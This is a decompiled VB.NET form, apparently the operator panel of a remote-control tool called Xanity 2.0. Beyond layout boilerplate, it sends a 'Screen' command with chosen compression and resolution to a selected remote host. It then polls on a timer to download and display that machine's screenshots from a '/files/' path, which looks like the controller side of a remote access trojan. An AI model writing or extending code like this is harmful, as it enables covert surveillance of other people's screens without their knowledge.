Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Xanity_2._0.My.Resources

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class remotescreen
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.remotescreen_Load)
            remotescreen.__ENCAddToList(Me)
            Me.server = New API
            Me.web = New WebClient
            Me.x = 0
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = remotescreen.__ENCList
            SyncLock list
                If (remotescreen.__ENCList.Count = remotescreen.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (remotescreen.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = remotescreen.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                remotescreen.__ENCList.Item(index) = remotescreen.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    remotescreen.__ENCList.RemoveRange(index, (remotescreen.__ENCList.Count - index))
                    remotescreen.__ENCList.Capacity = remotescreen.__ENCList.Count
                End If
                remotescreen.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        Private Sub btn_stop_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.tmrlisten.Stop
        End Sub

        Private Sub Buttonsave_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim dialog As New SaveFileDialog
                Dim dialog2 As SaveFileDialog = dialog
                dialog2.Filter = "Images | *.jpg"
                dialog2.InitialDirectory = Application.StartupPath
                dialog2.Title = "Select a Path to save the Screenshot!"
                dialog2.ShowDialog
                dialog2 = Nothing
                Me.screenshotbox.Image.Save(dialog.FileName)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Buttonstart_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str3 As String
                Dim host As String = Me.selected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.selected.Split(New Char() { "|"c })(1)
                If Me.RadioButton1.Checked Then
                    str3 = ("Screen|" & Me.trackbarvaluebox.Text & "|" & Me.RadioButton1.Text)
                ElseIf Me.RadioButton2.Checked Then
                    str3 = ("Screen|" & Me.trackbarvaluebox.Text & "|" & Me.RadioButton2.Text)
                Else
                    str3 = ("Screen|" & Me.trackbarvaluebox.Text & "|" & Me.RadioButton3.Text)
                End If
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(str3, host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error has occured !"
                Else
                    Me.FlatStatusBar1.Text = "Command sent!"
                    If (Me.x = 0) Then
                        Me.screenshotbox.SizeMode = PictureBoxSizeMode.CenterImage
                        Me.screenshotbox.Image = Resources.gif_load2
                    End If
                    Me.tmrlisten.Start
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error has occured !"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Function ByteArray2Image(ByVal ByAr As Byte()) As Image
            Dim stream As New MemoryStream(ByAr)
            Return Image.FromStream(stream)
        End Function

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Public Sub getscreen()
            Me.tmrlisten.Stop
            Dim str As String = Me.selected.Split(New Char() { "|"c })(1)
            Dim str2 As String = Me.selected.Split(New Char() { "|"c })(0)
            Try 
                Me.imagebytes = Me.web.DownloadData((str2 & "/files/" & str & ".jpg"))
                Me.screenshotbox.SizeMode = PictureBoxSizeMode.StretchImage
                Me.screenshotbox.Image = Me.ByteArray2Image(Me.imagebytes)
                Me.FlatStatusBar1.Text = "Picture retrieved!"
                Me.x = 1
                Me.Buttonstart_Click(Nothing, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(remotescreen))
            Me.FormSkin1 = New FormSkin
            Me.FlatMini1 = New FlatMini
            Me.FlatMax1 = New FlatMax
            Me.FlatCloseRE1 = New FlatCloseRE
            Me.intervall = New NumericUpDown
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.FlatLabel4 = New FlatLabel
            Me.RadioButton3 = New RadioButton
            Me.RadioButton2 = New RadioButton
            Me.RadioButton1 = New RadioButton
            Me.FlatLabel2 = New FlatLabel
            Me.ButtonSave = New FlatButton
            Me.btn_stop = New FlatButton
            Me.ButtonStart = New FlatButton
            Me.trackbarvaluebox = New FlatTextBox
            Me.FlatLabel1 = New FlatLabel
            Me.TrackBar1 = New FlatTrackBar
            Me.screenshotbox = New PictureBox
            Me.tmrlisten = New Timer(Me.components)
            Me.FormSkin1.SuspendLayout
            Me.intervall.BeginInit
            DirectCast(Me.screenshotbox, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.BorderColor = Color.White
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatCloseRE1)
            Me.FormSkin1.Controls.Add(Me.intervall)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.FlatLabel4)
            Me.FormSkin1.Controls.Add(Me.RadioButton3)
            Me.FormSkin1.Controls.Add(Me.RadioButton2)
            Me.FormSkin1.Controls.Add(Me.RadioButton1)
            Me.FormSkin1.Controls.Add(Me.FlatLabel2)
            Me.FormSkin1.Controls.Add(Me.ButtonSave)
            Me.FormSkin1.Controls.Add(Me.btn_stop)
            Me.FormSkin1.Controls.Add(Me.ButtonStart)
            Me.FormSkin1.Controls.Add(Me.trackbarvaluebox)
            Me.FormSkin1.Controls.Add(Me.FlatLabel1)
            Me.FormSkin1.Controls.Add(Me.TrackBar1)
            Me.FormSkin1.Controls.Add(Me.screenshotbox)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.DeepPink
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            Dim size2 As New Size(920, &H22D)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "RemoteDesktop"
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H34A, 13)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = &H16
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H362, 12)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = &H15
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatCloseRE1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatCloseRE1.BackColor = Color.White
            Me.FlatCloseRE1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatCloseRE1.Font = New Font("Marlett", 10!)
            point2 = New Point(890, 13)
            Me.FlatCloseRE1.Location = point2
            Me.FlatCloseRE1.Name = "FlatCloseRE1"
            size2 = New Size(&H12, &H12)
            Me.FlatCloseRE1.Size = size2
            Me.FlatCloseRE1.TabIndex = 20
            Me.FlatCloseRE1.Text = "FlatCloseRE1"
            Me.FlatCloseRE1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.intervall.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.intervall.ForeColor = Color.White
            Dim num As New Decimal(New Integer() { &H3E8, 0, 0, 0 })
            Me.intervall.Increment = num
            point2 = New Point(&H2E8, &H1D8)
            Me.intervall.Location = point2
            num = New Decimal(New Integer() { &H2710, 0, 0, 0 })
            Me.intervall.Maximum = num
            num = New Decimal(New Integer() { &H3E8, 0, 0, 0 })
            Me.intervall.Minimum = num
            Me.intervall.Name = "intervall"
            Me.intervall.ReadOnly = True
            size2 = New Size(&H52, &H1D)
            Me.intervall.Size = size2
            Me.intervall.TabIndex = &H13
            num = New Decimal(New Integer() { &HBB8, 0, 0, 0 })
            Me.intervall.Value = num
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H219)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.DeepPink
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(920, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = &H12
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.FlatLabel4.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.FlatLabel4.AutoSize = True
            Me.FlatLabel4.BackColor = Color.Transparent
            Me.FlatLabel4.Font = New Font("Segoe UI", 12!)
            Me.FlatLabel4.ForeColor = Color.White
            point2 = New Point(&H2A0, &H1DA)
            Me.FlatLabel4.Location = point2
            Me.FlatLabel4.Name = "FlatLabel4"
            size2 = New Size(&H49, &H15)
            Me.FlatLabel4.Size = size2
            Me.FlatLabel4.TabIndex = &H11
            Me.FlatLabel4.Text = "Intervall: "
            Me.RadioButton3.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.RadioButton3.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RadioButton3.Checked = False
            Me.RadioButton3.Cursor = Cursors.Hand
            Me.RadioButton3.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H259, &H1F2)
            Me.RadioButton3.Location = point2
            Me.RadioButton3.Name = "RadioButton3"
            Me.RadioButton3.Options = _Options.Style1
            size2 = New Size(&H56, &H16)
            Me.RadioButton3.Size = size2
            Me.RadioButton3.TabIndex = &H10
            Me.RadioButton3.Text = "1024x768"
            Me.RadioButton2.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.RadioButton2.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RadioButton2.Checked = True
            Me.RadioButton2.Cursor = Cursors.Hand
            Me.RadioButton2.Font = New Font("Segoe UI", 10!)
            point2 = New Point(510, &H1F2)
            Me.RadioButton2.Location = point2
            Me.RadioButton2.Name = "RadioButton2"
            Me.RadioButton2.Options = _Options.Style1
            size2 = New Size(&H55, &H16)
            Me.RadioButton2.Size = size2
            Me.RadioButton2.TabIndex = 15
            Me.RadioButton2.Text = "1440x900"
            Me.RadioButton1.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.RadioButton1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RadioButton1.Checked = False
            Me.RadioButton1.Cursor = Cursors.Hand
            Me.RadioButton1.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H19E, &H1F2)
            Me.RadioButton1.Location = point2
            Me.RadioButton1.Name = "RadioButton1"
            Me.RadioButton1.Options = _Options.Style1
            size2 = New Size(90, &H16)
            Me.RadioButton1.Size = size2
            Me.RadioButton1.TabIndex = 14
            Me.RadioButton1.Text = "1920x1080"
            Me.FlatLabel2.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.FlatLabel2.AutoSize = True
            Me.FlatLabel2.BackColor = Color.Transparent
            Me.FlatLabel2.Font = New Font("Segoe UI", 12!)
            Me.FlatLabel2.ForeColor = Color.White
            point2 = New Point(&H19E, &H1DA)
            Me.FlatLabel2.Location = point2
            Me.FlatLabel2.Name = "FlatLabel2"
            size2 = New Size(&H5B, &H15)
            Me.FlatLabel2.Size = size2
            Me.FlatLabel2.TabIndex = 12
            Me.FlatLabel2.Text = "Resulotion: "
            Me.ButtonSave.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.ButtonSave.BackColor = Color.Transparent
            Me.ButtonSave.BaseColor = Color.DeepPink
            Me.ButtonSave.Cursor = Cursors.Hand
            Me.ButtonSave.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H340, &H1FB)
            Me.ButtonSave.Location = point2
            Me.ButtonSave.Name = "ButtonSave"
            Me.ButtonSave.Rounded = False
            size2 = New Size(&H52, &H1B)
            Me.ButtonSave.Size = size2
            Me.ButtonSave.TabIndex = 11
            Me.ButtonSave.Text = "Save"
            Me.ButtonSave.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_stop.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.btn_stop.BackColor = Color.Transparent
            Me.btn_stop.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_stop.Cursor = Cursors.Hand
            Me.btn_stop.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H2E8, &H1FB)
            Me.btn_stop.Location = point2
            Me.btn_stop.Name = "btn_stop"
            Me.btn_stop.Rounded = False
            size2 = New Size(&H52, &H1B)
            Me.btn_stop.Size = size2
            Me.btn_stop.TabIndex = 10
            Me.btn_stop.Text = "Stop"
            Me.btn_stop.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.ButtonStart.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.ButtonStart.BackColor = Color.Transparent
            Me.ButtonStart.BaseColor = Color.White
            Me.ButtonStart.Cursor = Cursors.Hand
            Me.ButtonStart.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H340, &H1D9)
            Me.ButtonStart.Location = point2
            Me.ButtonStart.Name = "ButtonStart"
            Me.ButtonStart.Rounded = False
            size2 = New Size(&H52, &H1C)
            Me.ButtonStart.Size = size2
            Me.ButtonStart.TabIndex = 9
            Me.ButtonStart.Text = "Start"
            Me.ButtonStart.TextColor = Color.Black
            Me.trackbarvaluebox.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.trackbarvaluebox.BackColor = Color.Transparent
            point2 = New Point(&H175, &H1EE)
            Me.trackbarvaluebox.Location = point2
            Me.trackbarvaluebox.MaxLength = &H7FFF
            Me.trackbarvaluebox.Multiline = False
            Me.trackbarvaluebox.Name = "trackbarvaluebox"
            Me.trackbarvaluebox.ReadOnly = True
            size2 = New Size(&H23, &H1D)
            Me.trackbarvaluebox.Size = size2
            Me.trackbarvaluebox.TabIndex = 4
            Me.trackbarvaluebox.Text = "25"
            Me.trackbarvaluebox.TextAlign = HorizontalAlignment.Left
            Me.trackbarvaluebox.TextColor = Color.FromArgb(&HC0, &HC0, &HC0)
            Me.trackbarvaluebox.UseSystemPasswordChar = False
            Me.FlatLabel1.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 12!)
            Me.FlatLabel1.ForeColor = Color.White
            point2 = New Point(3, &H1DA)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&H6D, &H15)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 3
            Me.FlatLabel1.Text = "Compression: "
            Me.TrackBar1.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.TrackBar1.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.TrackBar1.HatchColor = Color.DeepPink
            point2 = New Point(7, &H1F2)
            Me.TrackBar1.Location = point2
            Me.TrackBar1.Maximum = 100
            Me.TrackBar1.Minimum = 0
            Me.TrackBar1.Name = "TrackBar1"
            Me.TrackBar1.ShowValue = False
            size2 = New Size(360, &H17)
            Me.TrackBar1.Size = size2
            Me.TrackBar1.Style = _Style.Slider
            Me.TrackBar1.TabIndex = 2
            Me.TrackBar1.Text = "FlatTrackBar1"
            Me.TrackBar1.TrackColor = Color.DeepPink
            Me.TrackBar1.Value = &H19
            Me.screenshotbox.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.screenshotbox.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            point2 = New Point(3, &H34)
            Me.screenshotbox.Location = point2
            Me.screenshotbox.Name = "screenshotbox"
            size2 = New Size(&H38F, &H19F)
            Me.screenshotbox.Size = size2
            Me.screenshotbox.SizeMode = PictureBoxSizeMode.StretchImage
            Me.screenshotbox.TabIndex = 0
            Me.screenshotbox.TabStop = False
            Me.tmrlisten.Interval = &HBB8
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(920, &H22D)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "remotescreen"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "remotescreen"
            Me.TransparencyKey = Color.Fuchsia
            Me.FormSkin1.ResumeLayout(False)
            Me.FormSkin1.PerformLayout
            Me.intervall.EndInit
            DirectCast(Me.screenshotbox, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
        End Sub

        Private Sub intervall_ValueChanged(ByVal sender As Object, ByVal e As EventArgs)
            Me.tmrlisten.Interval = Convert.ToInt32(Me.intervall.Value)
        End Sub

        Private Sub remotescreen_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.tmrlisten.Interval = Convert.ToInt32(Me.intervall.Value)
        End Sub

        Private Sub tmrlisten_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Me.getscreen
        End Sub

        Private Sub TrackBar1_Scroll(ByVal sender As Object)
            Me.trackbarvaluebox.Text = Conversions.ToString(Me.TrackBar1.Value)
        End Sub


        ' Properties
        Friend Overridable Property btn_stop As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_stop
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_stop_Click)
                If (Not Me._btn_stop Is Nothing) Then
                    RemoveHandler Me._btn_stop.Click, handler
                End If
                Me._btn_stop = value
                If (Not Me._btn_stop Is Nothing) Then
                    AddHandler Me._btn_stop.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ButtonSave As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._ButtonSave
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Buttonsave_Click)
                If (Not Me._ButtonSave Is Nothing) Then
                    RemoveHandler Me._ButtonSave.Click, handler
                End If
                Me._ButtonSave = value
                If (Not Me._ButtonSave Is Nothing) Then
                    AddHandler Me._ButtonSave.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ButtonStart As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._ButtonStart
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Buttonstart_Click)
                If (Not Me._ButtonStart Is Nothing) Then
                    RemoveHandler Me._ButtonStart.Click, handler
                End If
                Me._ButtonStart = value
                If (Not Me._ButtonStart Is Nothing) Then
                    AddHandler Me._ButtonStart.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatCloseRE1 As FlatCloseRE
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatCloseRE1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCloseRE)
                Me._FlatCloseRE1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel2 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel2 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel4 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel4 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property intervall As NumericUpDown
            <DebuggerNonUserCode> _
            Get
                Return Me._intervall
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As NumericUpDown)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.intervall_ValueChanged)
                If (Not Me._intervall Is Nothing) Then
                    RemoveHandler Me._intervall.ValueChanged, handler
                End If
                Me._intervall = value
                If (Not Me._intervall Is Nothing) Then
                    AddHandler Me._intervall.ValueChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton1 As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._RadioButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RadioButton)
                Me._RadioButton1 = value
            End Set
        End Property

        Friend Overridable Property RadioButton2 As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._RadioButton2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RadioButton)
                Me._RadioButton2 = value
            End Set
        End Property

        Friend Overridable Property RadioButton3 As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._RadioButton3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RadioButton)
                Me._RadioButton3 = value
            End Set
        End Property

        Friend Overridable Property screenshotbox As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._screenshotbox
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Me._screenshotbox = value
            End Set
        End Property

        Friend Overridable Property tmrlisten As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._tmrlisten
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.tmrlisten_Tick)
                If (Not Me._tmrlisten Is Nothing) Then
                    RemoveHandler Me._tmrlisten.Tick, handler
                End If
                Me._tmrlisten = value
                If (Not Me._tmrlisten Is Nothing) Then
                    AddHandler Me._tmrlisten.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property TrackBar1 As FlatTrackBar
            <DebuggerNonUserCode> _
            Get
                Return Me._TrackBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTrackBar)
                Dim handler As ScrollEventHandler = New ScrollEventHandler(AddressOf Me.TrackBar1_Scroll)
                If (Not Me._TrackBar1 Is Nothing) Then
                    RemoveHandler Me._TrackBar1.Scroll, handler
                End If
                Me._TrackBar1 = value
                If (Not Me._TrackBar1 Is Nothing) Then
                    AddHandler Me._TrackBar1.Scroll, handler
                End If
            End Set
        End Property

        Friend Overridable Property trackbarvaluebox As FlatTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._trackbarvaluebox
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatTextBox)
                Me._trackbarvaluebox = value
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("btn_stop")> _
        Private _btn_stop As FlatButton
        <AccessedThroughProperty("ButtonSave")> _
        Private _ButtonSave As FlatButton
        <AccessedThroughProperty("ButtonStart")> _
        Private _ButtonStart As FlatButton
        <AccessedThroughProperty("FlatCloseRE1")> _
        Private _FlatCloseRE1 As FlatCloseRE
        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatLabel2")> _
        Private _FlatLabel2 As FlatLabel
        <AccessedThroughProperty("FlatLabel4")> _
        Private _FlatLabel4 As FlatLabel
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("intervall")> _
        Private _intervall As NumericUpDown
        <AccessedThroughProperty("RadioButton1")> _
        Private _RadioButton1 As RadioButton
        <AccessedThroughProperty("RadioButton2")> _
        Private _RadioButton2 As RadioButton
        <AccessedThroughProperty("RadioButton3")> _
        Private _RadioButton3 As RadioButton
        <AccessedThroughProperty("screenshotbox")> _
        Private _screenshotbox As PictureBox
        <AccessedThroughProperty("tmrlisten")> _
        Private _tmrlisten As Timer
        <AccessedThroughProperty("TrackBar1")> _
        Private _TrackBar1 As FlatTrackBar
        <AccessedThroughProperty("trackbarvaluebox")> _
        Private _trackbarvaluebox As FlatTextBox
        Private components As IContainer
        Private imagebytes As Byte()
        Public selected As String
        Private server As API
        Private web As WebClient
        Private x As Integer
    End Class
End Namespace

